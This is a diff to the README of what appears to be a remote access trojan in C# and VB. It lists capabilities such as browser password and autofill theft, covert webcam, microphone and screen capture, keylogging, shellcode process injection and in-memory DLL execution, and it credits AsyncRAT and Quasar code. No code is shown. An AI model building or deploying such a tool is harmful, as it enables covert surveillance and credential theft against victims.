@@ -43,19 +43,21 @@ Of course. I plan to add features when I find them interesting to add. Please do
 
 ## Current features
 
-* Clients written in C# and VB (32 and 64 bit)
+* Clients written in C# and VB (32 and 64 bit) (dlls + exes)
 * Passwords recovery (automatically saved)
 * History recovery (automatically saved)
 * Autofill recovery (automatically saved)
 * Keywords recovery (automatically saved)
-* Blur screenlocker
 * Remote camera viewer (+ save pictures)
-* Remote desktop viewer (+ save pictures)
 * Remote microphone (automatically saved)
+* Remote desktop viewer (+ save pictures)
+* Remote keyboard
+* Remote mouse
+* Remote chat
 * Process manager 
 * Kill process (native techniques)
-* Suspend process
-* Resume process
+* Suspend process (native techniques)
+* Resume process (native techniques)
 * (shellcode) Process injection (NtWriteVirtualMemory + NtCreateThreadEx)
 * (shellcode) Process injection (NtMapViewOfSection + NtCreateThreadEx)
 * Shutdown system
@@ -72,6 +74,7 @@ Of course. I plan to add features when I find them interesting to add. Please do
 * (current client) Managed dll execution
 * (current client) Unmanaged dll execution
 * (current client) Shellcode execution
+* Blur screenlocker
 * Audio up
 * Audio down
 * Hide + show taskbar
@@ -84,7 +87,7 @@ Of course. I plan to add features when I find them interesting to add. Please do
 * Upload file
 * Get information (CPU, hardware, system)
 * Shortcuts (download, desktop and documents paths)
-* Logs ((automatically saved))
+* Logs (automatically saved)
 * Mass Tasks
 
 ## External depencencies
@@ -114,6 +117,7 @@ Of course. I plan to add features when I find them interesting to add. Please do
 * Settings saved with JSON format
 * Server .NET 4.8
 * Client .NET 4.5
+* Tested on freshly installed W10 & W11 VM
 
 ## DLLs
 
@@ -128,6 +132,7 @@ Client.EntryClass.Main()
 * Webcam plugins : [AsyncRat](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Plugin/RemoteCamera/RemoteCamera/Packet.cs)
 * Keylogger (modded) : [AsyncRat](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Plugin/LimeLogger/LimeLogger/Packet.cs)
 * Unmanaged pe and dlls : [schellingb](https://github.com/schellingb/DLLFromMemory-net)
+* Remote mouse & keyboard : [Quasar](https://github.com/quasar/Quasar/)
 
 ## TODO
 
